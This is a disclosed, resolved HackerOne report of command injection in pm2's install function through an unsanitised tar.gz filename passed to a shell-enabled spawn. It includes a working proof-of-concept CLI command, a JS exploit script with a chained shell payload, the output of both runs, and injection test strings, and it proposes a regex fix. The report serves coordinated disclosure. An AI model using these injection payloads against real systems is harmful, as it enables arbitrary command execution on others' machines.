{"id":630227,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzAyMjc=","url":"https://hackerone.com/reports/630227","title":"Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-06-26T20:19:49.389Z","submitted_at":"2019-06-26T20:19:49.389Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bl4de","url":"/bl4de","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-24T09:53:13.071Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-09-24T09:53:10.581Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Guys,\n\nIt's been a while :)\n\n\nI would like to report Command Injection in `pm2.import()` function when `tar.gz` archive is installed with a name provided as user controlled input.\nDue to lack of proper validation of `tar.gz` archive filename, this vulnerability allows to inject arbitrary commands and execute them in context of `pm2`.\n\n# Module\n\n**module name:** pm2\n**version:** 3.5.1\n**npm page:** `https://www.npmjs.com/package/pm2`\n\n## Module Description\n\nPM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\n\n## Module Stats\n\n**~320.000 downloads/week**\n**\u003e1.200.000 downloads/month**\n\n# Vulnerability\n\nPackages can be installed using `pm2 install [PACKAGE NAME|PACKAGE URL] [options]` command, both directly from command line and from script using `pm2` API. Arbitrary commands can be injected with either first or second method.\n\nHere's a command which executes `echo 'HERE'` in Bash:\n\n```\nbl4de:~/playground/Node $ ./pm2 install \"foo.tar.gz;echo 'HERE'\"\n[PM2][Module] Installing TAR module\n[PM2][Module] Installing package foo.tar.gz;echo 'HERE'\ntar: Error opening archive: Failed to open 'foo.tar.gz'\nHERE -C /var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T module/package.json\n[PM2][ERROR] ENOENT: no such file or directory, open '/var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T/module/package.json'\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show \u003cid|name\u003e` to get more details about an app\nbl4de:~/playground/Node $\n\n```\n\nAlso, `pm2` exposes API which can be used from external scripts and this is IMHO much more dangerous attack vector than directly from command line (but still can be exploited via Bash scripts run eg. by `cron` or any other automated fashion).\n\nHere's a simple JS exploit script (based on example provided on `https://pm2.io/doc/en/runtime/reference/pm2-programmatic/` page), which executes malicious commands defined as `payload` (this represents user provided input):\n\n\n```javascript\n// pm2_exploit.js\n\n'use strict'\nconst pm2 = require('pm2')\n\n// payload - user controllable input\nconst payload = \"foo.tar.gz;touch here;echo whoami\u003ehere;chmod +x here;./here\u003ewhoamreallyare\"\n\npm2.connect(function(err) {\n    if (err) {\n        console.error(err)\n        process.exit(2)\n    }\n\n    pm2.start({\n\n    }, (err, apps) =\u003e {\n        pm2.install(payload, {}) // injection\n        pm2.disconnect()\n        if (err) {\n            throw err\n        }\n    })\n})\n```\n\nAnd here's the result of its execution - the file `whoamreallyare` is created and result of `whoami` command execution is put into:\n\n```\nbl4de:~/playground/Node $ ll\ntotal 224\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -\u003e ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\nbl4de:~/playground/Node $ node pm2_exploit.js\n\n/Users/bl4de/playground/Node/pm2_exploit.js:20\n            throw err\n            ^\nError: No script path - aborting\ntar: Error opening archive: Failed to open 'foo.tar.gz'\nbl4de:~/playground/Node $ ll\ntotal 240\n-rwxr-xr-x    1 bl4de  staff       7 Jun 26 20:23 here\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -\u003e ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\n-rw-r--r--    1 bl4de  staff       6 Jun 26 20:23 whoamreallyare\nbl4de:~/playground/Node $ cat whoamreallyare\nbl4de\nbl4de:~/playground/Node $\n\n```\n\n## Vulnerability Description\n\nThe execution chain starts in `lib/API/Modules/Modularizer.js` file, in line 22, which is responsible for execution of `pm2 install` command (I've marked my comments with `////` at the beginning):\n\n```javascript\n/**\n * PM2 Module System.\n */\nModularizer.install = function (CLI, module_name, opts, cb) {\n  if (typeof(opts) == 'function') {\n    cb = opts;\n    opts = {};\n  }\n\n  if (LOCAL.INTERNAL_MODULES.hasOwnProperty(module_name)) {\n    Common.logMod(`Adding dependency ${module_name} to PM2 Runtime`);\n    var currentModule = LOCAL.INTERNAL_MODULES[module_name];\n    if (currentModule \u0026\u0026 currentModule.hasOwnProperty('dependencies')) {\n      LOCAL.installMultipleModules(currentModule.dependencies, cb);\n    } else {\n      LOCAL.install(currentModule, cb);\n    }\n  }\n  else if (module_name == '.') {\n    Common.logMod(`Installing local NPM module`);\n    return NPM.localStart(CLI, opts, cb)\n  }\n  else if (opts.tarball || module_name.indexOf('.tar.gz') \u003e -1) {   //// vulnerable code\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)  //// not sanitized module_name is used as an argument here \n  }\n  else {\n    Common.logMod(`Installing NPM ${module_name} module`);\n    NPM.install(CLI, module_name, opts, cb)\n  }\n};\n```\n\n\nHere's `TAR.install()` source code (`lib/API/Modules/TAR.js`, line 21). `module_name` variable from previous call is read as `module_filepath` argument:\n\n```javascript\n/**\n * Module management to manage tarball packages\n *\n * pm2 install http.tar.gz\n * pm2 uninstall http\n *\n * - the first and only folder in the tarball must be called module (tar zcvf http module/)\n * - a package.json must be present with attribute \"name\", \"version\" and \"pm2\" to declare apps to run\n */\n\nfunction install(PM2, module_filepath, opts, cb) {\n  // Remote file retrieval\n  if (module_filepath.includes('http') === true) {\n    var target_file = module_filepath.split('/').pop()\n    var target_filepath = path.join(os.tmpdir(), target_file)\n\n    opts.install_url = module_filepath\n\n    return retrieveRemote(module_filepath, target_filepath, (err) =\u003e {\n      if (err) {\n        Common.errMod(err)\n        process.exit(1)\n      }\n      installLocal(PM2, target_filepath, opts, cb)\n    })\n  }\n\n  // Local install\n  installLocal(PM2, module_filepath, opts, cb)   //// call to vulnerable function with unsanitized module_filepath\n}\n```\n\n\nLast step in execution chain is `installLocal()` function call in the same `TAR.js` file (`lib/API/Modules/TAR.js`, line 71):\n\n\n\n```javascript\nfunction installLocal(PM2, module_filepath, opts, cb) {\n  Common.logMod(`Installing package ${module_filepath}`)\n\n  // Get module name by unpacking the module/package.json only and read the name attribute\n  getModuleName(module_filepath, function(err, module_name) {\n    if (err) return cb(err)\n\n    Common.logMod(`Module name is ${module_name}`)\n\n    Common.logMod(`Depackaging module...`)\n\n    var install_path = path.join(cst.DEFAULT_MODULE_PATH, module_name);\n\n    if (fs.existsSync(install_path)) {\n      deleteModulePath(module_name)\n    }\n\n    require('mkdirp').sync(install_path)\n\n    //// here unsanitized module_filepath reaches execution sink:\n    var install_instance = spawn('tar', ['zxf', module_filepath, '-C', install_path, '--strip-components 1'], {\n      stdio : 'inherit',\n      env: process.env,\n\t\t  shell : true\n    })\n\n    install_instance.on('close', function(code) {\n      Common.logMod(`Module depackaged in ${install_path}`)\n      if (code == 0)\n        return runInstall(PM2, install_path, module_name, opts, cb)\n      return PM2.exitCli(1)\n    });\n\n    install_instance.on('error', function (err) {\n      console.error(err.stack || err);\n    });\n  })\n}\n\n```\n\nIn the line marked with my comment `module_filepath` finally reaches `tar` OS command call, which executes payload injected as a part of `tar` archive filename.\n\n\n## Steps To Reproduce:\n\n- install pm2 (`npm i pm2`) - I've installed it locally and made symlink to executable `./node_modules/pm2/bin/pm2` in the same folder with `ln -s ./node_modules/pm2/bin/pm2 pm2` command\n- run `pm2 start` to run and verify if `pm2` is installed correctly. You should see output similar to following:\n\n```\nbl4de:~/playground/Node $ ./pm2 start\n[PM2][ERROR] File ecosystem.config.js not found\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show \u003cid|name\u003e` to get more details about an app\nbl4de:~/playground/Node $\n```\n\n- save `pm2_exploit.js` provided in section above in the same folder and run it with `node pm2_exploit.js` command\n- verify that file `whoamreallyare` was created and your username is saved there\n\n\n{F517386}\n\n\n\n## Patch\n\nThe vulnerability exists, because `tar` archive filename provided as an argument of `pm2 install` command is not validated in the correct way (here's part of `lib/API/Modules/Modularizer.js` file, `Modularizer.install` function source code):\n\n```\nelse if (opts.tarball || module_name.indexOf('.tar.gz') \u003e -1) {\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)\n  }\n```\n\n`module_name.indexOf('.tar.gz') \u003e -1` will return `true` always, even if it's not present at the end of the filename. Also, there is no sanitization against Bash special characters like `;` or `|` which allows to inject arbitrary commands after `tar.gz` file extension.\n\nMy suggestion is to use validation similar to following (RegExp checks if filename contains only allowed characters and ends with `tar.gz`):\n\n```javascript\nelse if (opts.tarball || /^[a-z_\\.-]+tar\\.gz$/ig.test(module_name)) {\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)\n  }\n\n```\n\nAfter this change, injection is no longer possible:\n\n```javascript\n'use strict';\n\nconst module_names = [\n    'foo.tar.gz',\n    'some-module_name.with_special_characters_but_still-valid.tar.gz',\n    'foo.tar.gz;echo \"HERE\"',    // sample injection at the end of the filename, after ;\n    'tar.gz;whoami|ls;foo.tar.gz'   // sample injection in the middle of filename\n    ];\n\n\nmodule_names.forEach( module_name =\u003e console.log(/^[a-z_\\.-]+tar\\.gz$/ig.test(module_name) === true ))\n\n/*\ntrue\ntrue\nfalse\nfalse\n*/\n```\n\n\n## Supporting Material/References:\n\nVulnerability was tested with following configuration:\n\n- macOS 10.14.5\n- Node 10.13.0\n- npm 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nCheers,\n\nbl4de\n\n## Impact\n\nAn attacker is able to execute arbitrary commands if the name of `tar` archive comes as user provided input (eg. from external script using `pm2` API) and is used 'as-is' in `pm2.install()` call","vulnerability_information_html":"\u003cp\u003eHi Guys,\u003c/p\u003e\n\n\u003cp\u003eIt\u0026#39;s been a while :)\u003c/p\u003e\n\n\u003cp\u003eI would like to report Command Injection in \u003ccode\u003epm2.import()\u003c/code\u003e function when \u003ccode\u003etar.gz\u003c/code\u003e archive is installed with a name provided as user controlled input.\u003cbr\u003e\nDue to lack of proper validation of \u003ccode\u003etar.gz\u003c/code\u003e archive filename, this vulnerability allows to inject arbitrary commands and execute them in context of \u003ccode\u003epm2\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e pm2\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 3.5.1\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/pm2\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003ePM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003e~320.000 downloads/week\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026gt;1.200.000 downloads/month\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003cp\u003ePackages can be installed using \u003ccode\u003epm2 install [PACKAGE NAME|PACKAGE URL] [options]\u003c/code\u003e command, both directly from command line and from script using \u003ccode\u003epm2\u003c/code\u003e API. Arbitrary commands can be injected with either first or second method.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s a command which executes \u003ccode\u003eecho \u0026#39;HERE\u0026#39;\u003c/code\u003e in Bash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebl4de:~/playground/Node $ ./pm2 install \u0026quot;foo.tar.gz;echo \u0026#39;HERE\u0026#39;\u0026quot;\n[PM2][Module] Installing TAR module\n[PM2][Module] Installing package foo.tar.gz;echo \u0026#39;HERE\u0026#39;\ntar: Error opening archive: Failed to open \u0026#39;foo.tar.gz\u0026#39;\nHERE -C /var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T module/package.json\n[PM2][ERROR] ENOENT: no such file or directory, open \u0026#39;/var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T/module/package.json\u0026#39;\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show \u0026lt;id|name\u0026gt;` to get more details about an app\nbl4de:~/playground/Node $\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlso, \u003ccode\u003epm2\u003c/code\u003e exposes API which can be used from external scripts and this is IMHO much more dangerous attack vector than directly from command line (but still can be exploited via Bash scripts run eg. by \u003ccode\u003ecron\u003c/code\u003e or any other automated fashion).\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s a simple JS exploit script (based on example provided on \u003ccode\u003ehttps://pm2.io/doc/en/runtime/reference/pm2-programmatic/\u003c/code\u003e page), which executes malicious commands defined as \u003ccode\u003epayload\u003c/code\u003e (this represents user provided input):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// pm2_exploit.js\u003c/span\u003e\n\n\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003euse strict\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epm2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// payload - user controllable input\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efoo.tar.gz;touch here;echo whoami\u0026gt;here;chmod +x here;./here\u0026gt;whoamreallyare\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eapps\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{})\u003c/span\u003e \u003cspan class=\"c1\"\u003e// injection\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003epm2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edisconnect\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd here\u0026#39;s the result of its execution - the file \u003ccode\u003ewhoamreallyare\u003c/code\u003e is created and result of \u003ccode\u003ewhoami\u003c/code\u003e command execution is put into:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebl4de:~/playground/Node $ ll\ntotal 224\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -\u0026gt; ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\nbl4de:~/playground/Node $ node pm2_exploit.js\n\n/Users/bl4de/playground/Node/pm2_exploit.js:20\n            throw err\n            ^\nError: No script path - aborting\ntar: Error opening archive: Failed to open \u0026#39;foo.tar.gz\u0026#39;\nbl4de:~/playground/Node $ ll\ntotal 240\n-rwxr-xr-x    1 bl4de  staff       7 Jun 26 20:23 here\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -\u0026gt; ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\n-rw-r--r--    1 bl4de  staff       6 Jun 26 20:23 whoamreallyare\nbl4de:~/playground/Node $ cat whoamreallyare\nbl4de\nbl4de:~/playground/Node $\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThe execution chain starts in \u003ccode\u003elib/API/Modules/Modularizer.js\u003c/code\u003e file, in line 22, which is responsible for execution of \u003ccode\u003epm2 install\u003c/code\u003e command (I\u0026#39;ve marked my comments with \u003ccode\u003e////\u003c/code\u003e at the beginning):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"cm\"\u003e/**\n * PM2 Module System.\n */\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eModularizer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003etypeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efunction\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eopts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eLOCAL\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eINTERNAL_MODULES\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eCommon\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogMod\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Adding dependency \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e to PM2 Runtime`\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ecurrentModule\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eLOCAL\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eINTERNAL_MODULES\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003emodule_name\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecurrentModule\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003ecurrentModule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003edependencies\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eLOCAL\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstallMultipleModules\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecurrentModule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edependencies\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eLOCAL\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einstall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecurrentModule\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecb\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 